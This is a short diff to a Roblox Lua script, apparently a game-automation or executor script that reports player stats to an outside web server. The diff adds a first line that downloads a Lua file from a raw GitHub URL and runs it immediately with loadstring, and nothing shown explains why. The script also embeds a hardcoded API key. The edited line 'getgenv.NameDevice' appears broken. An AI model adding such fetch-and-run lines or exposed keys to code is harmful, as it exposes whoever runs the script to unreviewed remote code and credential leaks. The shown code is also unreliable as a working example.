@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SandKingTH/RawScriptAll/refs/heads/main/logbs.lua"))()
+
 local IP_Server = "https://nextplaymanager.nextplay.club"
 
 repeat task.wait() until game:IsLoaded()
@@ -75,7 +77,7 @@ local function updateStatusWebLog()
             Method  = "POST",
             Headers = { ["Content-Type"] = "application/json", ["x-api-key"] = "wma_Kx9mP2nQ8rT4vW6j" },
             Body    = HttpService:JSONEncode({
-                device                  = NameDevice,
+                device                  = getgenv.NameDevice,
                 username                = localPlayer.Name,
                 jobid                   = tostring(game.JobId),
                 ["Total Level"]         = xp_to_level(DataCore.xp["total_level"]),
